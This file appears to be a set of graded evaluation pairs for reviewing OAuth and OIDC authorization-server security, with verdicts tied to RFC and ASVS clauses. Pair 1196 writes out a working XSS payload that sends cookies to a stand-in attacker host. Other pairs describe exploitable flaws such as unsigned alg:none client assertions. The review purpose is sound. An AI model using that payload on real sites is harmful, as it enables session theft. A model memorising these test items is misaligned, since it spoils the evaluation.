# Node 08 — Arbiter Set Extension 46
# Sub-phase: 3.4 Security and Authorization Model
# Pair ID prefix: CB4-3.4-
# Sequences: 1193–1200 (16 instances — 8 base pairs × 2 phrasings)
# Sources: RFC 7519 §4.1.7, OIDC Discovery §3, RFC 6749 §5.1,
#          CWE-79 / ASVS V5.3.3, ASVS V7.2, RFC 6749 §4.1.3,
#          RFC 8725 §2.1, OIDC Core §6
# Running total after this file: 2400 instances (1200 base pairs)
# Formula check: 120 + (1200 − 60) × 2 = 120 + 2280 = 2400 ✓

---

## Pair[CB4-3.4-1193]/A

Authorization server issues JWT access tokens with a `jti` (JWT ID) claim and
uses a Redis-backed jti blocklist for revocation and replay detection. However,
a bug in the jti generation module causes the server to use a sequential 8-bit
counter for jti values — after 256 tokens, jti values cycle back to 0 and repeat.
The Redis TTL on blocklist entries is 15 minutes (matching token TTL). Within a
15-minute window, two tokens with the same jti value are valid simultaneously,
and the blocklist cannot distinguish between them. The team argues that jti is
not a security requirement when `exp` is set correctly.

## Pair[CB4-3.4-1193]/B

REPROCESS. RFC 7519 §4.1.7 MUST: when `jti` is used to prevent JWT replay, the
value MUST be unique per token. An 8-bit counter that cycles within the token
TTL window generates colliding jti values — two valid tokens with the same jti
cannot be independently tracked, revoked, or distinguished in the blocklist.
The `exp` argument is rejected: `exp` and `jti` serve different purposes —
`exp` defines a time window, `jti` provides a unique handle within that window;
the replay-prevention purpose of jti requires uniqueness that `exp` alone cannot
provide. Non-unique jti collapses the entire revocation model.

## Pair[CB4-3.4-1193]/Reason

RFC 7519 §4.1.7 MUST unique jti when used for replay prevention; 8-bit counter
cycles within TTL window → jti collision → REPROCESS. `exp` does not substitute
for unique jti in revocation/replay detection.

## Pair[CB4-3.4-1193]/Phrasing-B

Verdict REPROCESS. RFC 7519 §4.1.7: when jti is used for replay prevention, the
value MUST be unique. An 8-bit counter that wraps every 256 tokens — well within
the 15-minute TTL — generates colliding jti values. The blocklist cannot distinguish
token A from token B when they share the same jti. The `exp`/jti separation argument
is rejected: these claims serve complementary purposes; uniqueness is required for
jti to function as a revocation handle. MUST violated; REPROCESS.

---

## Pair[CB4-3.4-1194]/A

OIDC provider's discovery document at `/.well-known/openid-configuration`
contains all REQUIRED fields (`issuer`, `authorization_endpoint`,
`token_endpoint`, `jwks_uri`, `response_types_supported`,
`subject_types_supported`, `id_token_signing_alg_values_supported`) but does
not include `claims_supported`. A client consuming the discovery document
cannot determine which claims are available without making a test UserInfo
request. The AS team argues that `claims_supported` is optional.

## Pair[CB4-3.4-1194]/B

CONCERN. OIDC Core Discovery §3 classifies `claims_supported` as RECOMMENDED —
not REQUIRED. The AS team's citation of optionality is accurate for the minimum
conformance profile; the field is not in the REQUIRED set. The absence of
`claims_supported` is a guidance gap: clients cannot programmatically determine
available claims without a test request, and claim-set changes are not
discoverable. No unconditional MUST applies; RECOMMENDED-level gap → CONCERN
not REPROCESS.

## Pair[CB4-3.4-1194]/Reason

OIDC Discovery §3 `claims_supported` RECOMMENDED, not REQUIRED; absence is
permitted for minimum conformance; RECOMMENDED guidance gap → CONCERN.

## Pair[CB4-3.4-1194]/Phrasing-B

Verdict CONCERN. OIDC Core Discovery §3 marks `claims_supported` as RECOMMENDED —
the AS team's optionality argument is correct for minimum conformance. Without
`claims_supported`, discovery-conformant clients cannot determine available claims
programmatically; claim availability is only discoverable via trial requests. The
gap is guidance-level; no unconditional MUST applies. CONCERN not REPROCESS.

---

## Pair[CB4-3.4-1195]/A

Authorization server issues access tokens with a 900-second (15-minute) actual
lifetime (`exp = iat + 900`) but the token endpoint response includes
`"expires_in": 3600`. Clients receiving the token cache it for up to 3600 seconds
before attempting refresh, but the token has been invalid since 900 seconds. This
causes silent 401 failures after 15 minutes without client-side warning. The AS
team argues that `expires_in` is optional per RFC 6749 §5.1 and that including
any value is better than omitting it.

## Pair[CB4-3.4-1195]/B

CONCERN. RFC 6749 §5.1 defines `expires_in` as "the lifetime in seconds of
the access token." If included, the value should accurately represent the actual
token lifetime; a value of 3600 that contradicts an exp-derived lifetime of 900
is misleading. However, RFC 6749 §5.1 does not contain an explicit MUST for
accuracy when `expires_in` is present — it provides a definition, not a MUST
prohibition on misrepresentation. The practical impact is significant (silent 401
failures, unexpected token expiry) but the normative gap is guidance-level.
CONCERN not REPROCESS.

## Pair[CB4-3.4-1195]/Reason

RFC 6749 §5.1 defines expires_in as the actual token lifetime; inaccurate value
misrepresents lifetime causing silent 401s; no explicit MUST for accuracy when
present — guidance gap → CONCERN.

## Pair[CB4-3.4-1195]/Phrasing-B

Verdict CONCERN. RFC 6749 §5.1 defines `expires_in` as "the lifetime in seconds
of the access token" — a definition that implies accuracy but does not contain
an explicit MUST for correctness of the provided value. The 3600/900 discrepancy
causes silent 401 failures and incorrect client-side cache management. The impact
is operationally meaningful but the normative anchor is definitional rather than
an explicit MUST; guidance gap → CONCERN not REPROCESS.

---

## Pair[CB4-3.4-1196]/A

Authorization server's login page renders the `login_hint` query parameter
directly into the value attribute of the username input field:
`<input type="text" value="{{ login_hint }}">`. The `login_hint` value is not
HTML-encoded before injection. An attacker constructs an authorization URL with
`login_hint="><script>document.location='https://attacker.example.com/steal?c='+document.cookie</script>`.
When a victim opens the crafted authorization URL, the AS login page executes
the attacker's script at the AS origin. No OIDC `login_hint` validation is
performed.

## Pair[CB4-3.4-1196]/B

REPROCESS. CWE-79 (Cross-Site Scripting) and ASVS V5.3.3: all output rendered
in HTML contexts MUST be HTML-encoded to prevent injection. An AS that echoes
query parameters into HTML without encoding is vulnerable to stored or reflected
XSS at the AS origin. The AS origin is highly sensitive — it holds user
authentication sessions and OAuth authorization flows; XSS at the AS origin
enables session theft, token theft, and authorization flow manipulation. Output
encoding of user-controlled input into HTML is an unconditional MUST in ASVS
V5.3.3; omission is a REPROCESS finding.

## Pair[CB4-3.4-1196]/Reason

CWE-79 + ASVS V5.3.3 MUST HTML-encode user input in HTML contexts; login_hint
echoed unencoded into HTML value attribute → XSS at AS origin → REPROCESS.

## Pair[CB4-3.4-1196]/Phrasing-B

Verdict REPROCESS. CWE-79 (XSS) and ASVS V5.3.3 require that all user-controlled
input rendered in HTML contexts MUST be output-encoded. The `login_hint` parameter
is directly interpolated into the HTML value attribute without encoding. XSS at
the AS origin is a critical vulnerability: the attacker script executes in the
security context of the authorization server, where authentication sessions,
consent state, and OAuth codes are accessible. Output encoding is an unconditional
MUST; the absence is a REPROCESS finding.

---

## Pair[CB4-3.4-1197]/A

Authorization server issues session cookies to maintain user authentication
state during the authorization flow. The session cookie is set with
`Secure`, `HttpOnly`, and a `Path=/` attribute, but the `SameSite` attribute
is absent. Modern browser default for missing `SameSite` is `Lax` in most
implementations, providing partial CSRF protection. The security team notes
that `SameSite=Strict` would provide stronger protection and asks whether the
absence of an explicit `SameSite` attribute constitutes a REPROCESS-level finding.

## Pair[CB4-3.4-1197]/B

CONCERN. ASVS V7.2 (Session Management — cookie security attributes) and OWASP
guidance recommend `SameSite=Strict` or `SameSite=Lax` for session cookies to
mitigate CSRF and cross-origin request risks. The browser default of `Lax`
provides partial protection (blocks cross-site POST, allows cross-site GET-based
navigation). No unconditional RFC MUST requires an explicit `SameSite` attribute
value — the guidance is defense-in-depth. The absence of explicit `SameSite=Strict`
is a guidance gap. CONCERN not REPROCESS.

## Pair[CB4-3.4-1197]/Reason

ASVS V7.2 / OWASP guidance: SameSite=Strict recommended for session cookies;
no unconditional RFC MUST; browser Lax default provides partial protection;
guidance-level gap → CONCERN.

## Pair[CB4-3.4-1197]/Phrasing-B

Verdict CONCERN. ASVS V7.2 and OWASP session management guidance recommend
explicit `SameSite=Strict` for AS session cookies to prevent CSRF in the
authorization flow. No unconditional RFC MUST requires a specific `SameSite`
value; browser-default `Lax` mitigates the most common CSRF vectors (cross-site
POST). The absence of explicit `SameSite` is a defense-in-depth guidance gap.
CONCERN not REPROCESS; remediation: set `SameSite=Strict` explicitly.

---

## Pair[CB4-3.4-1198]/A

Authorization server issues an authorization code for a `client_credentials`
client A. A different client B obtains client A's authorization code (via a
network intercept) and attempts to exchange it at the token endpoint, presenting
its own valid `client_secret`. The AS validates client B's credentials
successfully, locates the authorization code in the database, but does not
verify that the code was originally issued to client A — it issues an access
token to client B. RFC 6749 §4.1.3 requires the AS to verify client identity
binding on authorization code exchanges.

## Pair[CB4-3.4-1198]/B

REPROCESS. RFC 6749 §4.1.3 MUST: the authorization server must ensure that
the authorization code was issued to the authenticated client presenting it
at the token endpoint. Issuing an access token to client B for a code that
was issued to client A violates this MUST unconditionally. The client B
credential validation step is orthogonal to the client-code binding check;
both must pass simultaneously. Without the binding check, any authenticated
client can exchange any intercepted authorization code — eliminating the
authorization code's per-client security guarantee.

## Pair[CB4-3.4-1198]/Reason

RFC 6749 §4.1.3 MUST verify that auth code was issued to the requesting client;
client A's code exchanged by client B after intercepting it violates MUST;
client B credential validity is orthogonal to binding check → REPROCESS.

## Pair[CB4-3.4-1198]/Phrasing-B

Verdict REPROCESS. RFC 6749 §4.1.3 requires the AS to verify that the
authorization code was issued to the authenticated client making the exchange
request. Authenticating client B's credentials does not satisfy the binding
check — the client MUST be the same one to whom the code was issued. Client B
receiving an access token from client A's intercepted code violates the MUST
and enables cross-client authorization code exploitation. The credential
validation and the binding check are distinct, independent requirements.

---

## Pair[CB4-3.4-1199]/A

Confidential client uses `private_key_jwt` for token endpoint authentication
(RFC 7523). The client sends a JWT client assertion with `alg: none` in the
JOSE header — the assertion is unsigned. The authorization server validates the
`client_id` and `iss` claims in the unsigned assertion and, because the
assertion carries the correct `client_id`, issues an access token without
performing any cryptographic verification of the assertion. The team argues that
`client_id` presence in the assertion is sufficient to identify the client.

## Pair[CB4-3.4-1199]/B

REPROCESS. RFC 8725 §2.1 MUST NOT: signed JWTs MUST NOT use `alg=none`. This
MUST NOT applies to all signed JWT contexts — including JWT client assertions
under RFC 7523. An unsigned client assertion provides no cryptographic proof of
client identity; any party knowing the target `client_id` can forge an unsigned
assertion and impersonate the client at the token endpoint. The `client_id`
presence argument is rejected: the purpose of `private_key_jwt` authentication
is to prove possession of the private key; an unsigned assertion proves nothing.

## Pair[CB4-3.4-1199]/Reason

RFC 8725 §2.1 MUST NOT alg:none for signed JWTs; applies to JWT client assertions
(RFC 7523); unsigned assertion proves no key possession; client_id-alone argument
rejected → REPROCESS.

## Pair[CB4-3.4-1199]/Phrasing-B

Verdict REPROCESS. RFC 8725 §2.1 MUST NOT applies universally to signed JWTs —
including JWT client assertions under RFC 7523. The purpose of `private_key_jwt`
authentication is to prove possession of the client's private key through a
cryptographic signature; `alg=none` removes that proof entirely. Accepting an
unsigned assertion based on `client_id` alone is equivalent to accepting no
authentication — any caller knowing the `client_id` can forge and submit the
assertion. MUST NOT violated; REPROCESS.

---

## Pair[CB4-3.4-1200]/A

OIDC provider's discovery document lists the `userinfo_endpoint` as
`http://as.example.com/userinfo` — plain HTTP. The AS team argues that
the UserInfo endpoint receives only read requests for user profile claims
and that HTTPS is only required for endpoints that handle sensitive credentials
such as the token endpoint and authorization endpoint.

## Pair[CB4-3.4-1200]/B

REPROCESS. OIDC Core §6 requires that the AS use HTTPS for all endpoints:
the specification does not limit the TLS requirement to credential-handling
endpoints. The UserInfo endpoint transmits user profile claims (name, email,
phone, address) in its response — this is PII. A plain HTTP UserInfo endpoint
allows on-path attackers to intercept PII in transit and to mount replay
attacks against the Bearer token used to access it. The argument that only
credential-handling endpoints require HTTPS is rejected; OIDC Core §6 MUST
HTTPS is unconditional and covers all AS endpoints including UserInfo.

## Pair[CB4-3.4-1200]/Reason

OIDC Core §6 MUST HTTPS for all AS endpoints; UserInfo endpoint on HTTP
transmits PII over plaintext; credential-endpoints-only argument rejected →
REPROCESS.

## Pair[CB4-3.4-1200]/Phrasing-B

Verdict REPROCESS. OIDC Core §6 requires HTTPS for all authorization server
endpoints — the MUST is not limited to credential-handling endpoints. The UserInfo
endpoint returns user profile PII (name, email, phone, address) in its response
body; a plain HTTP endpoint allows on-path interception of this PII and Bearer
token replay. The team's scoped-HTTPS argument is rejected: OIDC Core §6 MUST
covers all AS endpoints. REPROCESS.
